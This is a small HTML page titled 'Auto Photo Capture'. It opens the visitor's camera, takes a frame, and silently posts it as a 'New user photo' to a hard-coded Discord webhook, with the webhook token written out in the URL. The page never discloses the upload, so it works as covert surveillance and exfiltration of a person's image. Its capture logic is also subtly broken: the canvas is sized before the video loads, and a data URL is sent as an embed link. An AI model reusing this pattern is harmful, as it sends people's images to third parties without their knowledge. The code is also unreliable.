<!DOCTYPE html>
<html>
<head>
    <title>Auto Photo Capture</title>
    <script>
        function capturePhoto() {
            // Access the user's camera
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function (stream) {
                    // Create a video element to display the camera stream
                    var video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    // Create a canvas element to capture the photo
                    var canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    // Wait for the video to load and then capture the photo
                    video.addEventListener('loadedmetadata', function () {
                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                        // Convert the photo to a data URL
                        var dataURL = canvas.toDataURL();

                        // Send the photo to Discord
                        sendToDiscord(dataURL);

                        // Stop the camera stream
                        stream.getTracks().forEach(function (track) {
                            track.stop();
                        });
                    });
                })
                .catch(function (error) {
                    console.error('Error accessing camera:', error);
                });
        }

        function sendToDiscord(dataURL) {
            // Send the dataURL to the Discord channel using an API or webhook
            // Replace the placeholder URL with the actual Discord API or webhook URL
            var discordURL = 'https://discord.com/api/webhooks/1187545279960981535/Zy3DgtGfbw7TLCo5H6jQKp1ZQ_5EHf-vhsG4X7ZRqlPZrdQ0mmuLBOVgCoCOgmawzjYX';
            var payload = {
                content: 'New user photo:',
                embeds: [
                    {
                        image: {
                            url: dataURL
                        }
                    }
                ]
            };

            fetch(discordURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
                .then(function (response) {
                    if (response.ok) {
                        console.log('Photo sent to Discord successfully');
                    } else {
                        console.error('Error sending photo to Discord:', response.status);
                    }
                })
                .catch(function (error) {
                    console.error('Error sending photo to Discord:', error);
                });
        }
    </script>
</head>
<body>
    <h1>Auto Photo Capture</h1>
    <button onclick="capturePhoto()">Capture Photo</button>
</body>
</html>
